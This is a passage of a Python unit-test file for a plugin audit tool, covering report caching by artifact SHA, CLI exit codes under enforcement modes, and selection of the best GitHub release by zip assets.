    def test_cache_miss_returns_none(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = ap.load_cached_report(tmp, "https://github.com/x/y", "v1", "abc")
            self.assertIsNone(result)

    def test_cache_roundtrip(self):
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/repo",
            release="v1.0.0",
            artifact_sha256="a" * 64,
            final_classification="PASS",
        )
        with tempfile.TemporaryDirectory() as tmp:
            ap.save_cached_report(tmp, report, "v1.0.0@99")
            loaded = ap.load_cached_report(
                tmp,
                "https://github.com/owner/repo",
                "v1.0.0@99",
                "a" * 64,
            )
        self.assertIsNotNone(loaded)
        self.assertEqual(loaded.final_classification, "PASS")

    def test_different_sha_causes_cache_miss(self):
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/repo",
            release="v1.0.0",
            artifact_sha256="a" * 64,
            final_classification="PASS",
        )
        with tempfile.TemporaryDirectory() as tmp:
            ap.save_cached_report(tmp, report, "v1.0.0@99")
            loaded = ap.load_cached_report(
                tmp,
                "https://github.com/owner/repo",
                "v1.0.0@99",
                "b" * 64,  # different SHA
            )
        self.assertIsNone(loaded)


# ---------------------------------------------------------------------------
# CLI argument handling
# ---------------------------------------------------------------------------

class TestCLI(unittest.TestCase):
    def test_missing_mode_exits_error(self):
        with self.assertRaises(SystemExit) as ctx:
            ap.main([])
        self.assertNotEqual(ctx.exception.code, 0)

    def test_infrastructure_error_exits_1(self):
        """AUDIT_ERROR always exits 1 regardless of enforcement mode."""
        meta_err = Exception("network down")
        with (
            patch.object(ap, "get_repo_metadata", side_effect=meta_err),
            patch.object(ap, "read_repo_urls", return_value=["https://github.com/owner/repo"]),
            tempfile.TemporaryDirectory() as tmp,
        ):
            code = ap.main([
                "--all",
                "--plugins-file", __file__,  # any existing file
                "--output-dir", tmp,
                "--skip-cache",
            ])
        self.assertEqual(code, 1)

    def test_report_only_mode_does_not_exit_2_on_block(self):
        """In report-only mode, BLOCK findings must not exit 2."""
        policy = ap._default_policy()
        policy["enforcement"]["mode"] = "report-only"

        block_report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/bad-plugin",
            final_classification="BLOCK",
            artifact_sha256="a" * 64,
        )

        with (
            patch.object(ap, "load_policy", return_value=policy),
            patch.object(ap, "load_allowlist", return_value=[]),
            patch.object(ap, "read_repo_urls", return_value=["https://github.com/owner/bad-plugin"]),
            patch.object(ap, "audit_repository", return_value=block_report),
            tempfile.TemporaryDirectory() as tmp,
        ):
            code = ap.main([
                "--all",
                "--plugins-file", __file__,
                "--output-dir", tmp,
                "--skip-cache",
            ])
        self.assertEqual(code, 0)


# ---------------------------------------------------------------------------
# find_best_release
# ---------------------------------------------------------------------------

class TestFindBestRelease(unittest.TestCase):
    def _make_release(self, tag: str, prerelease: bool, zips: int) -> dict:
        assets = [{"name": f"plugin{i}.zip", "browser_download_url": f"https://x/{i}.zip"}
                  for i in range(zips)]
        return {"tag_name": tag, "prerelease": prerelease, "assets": assets}

    def test_selects_latest_stable_with_one_zip(self):
        releases = [
            self._make_release("v2.0.0", False, 1),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v2.0.0")

    def test_skips_releases_with_zero_zips(self):
        releases = [
            self._make_release("v2.0.0", False, 0),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v1.0.0")

    def test_skips_releases_with_multiple_zips(self):
        releases = [
            self._make_release("v2.0.0", False, 2),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v1.0.0")

    def test_falls_back_to_prerelease_if_no_stable(self):
        releases = [self._make_release("v1.0.0-beta.1", True, 1)]
        r = ap.find_best_release(releases)
        self.assertIsNotNone(r)

    def test_no_eligible_release_returns_none(self):
        releases = [self._make_release("v1.0.0", False, 0)]
        self.assertIsNone(ap.find_best_release(releases))


if __name__ == "__main__":
    unittest.main()
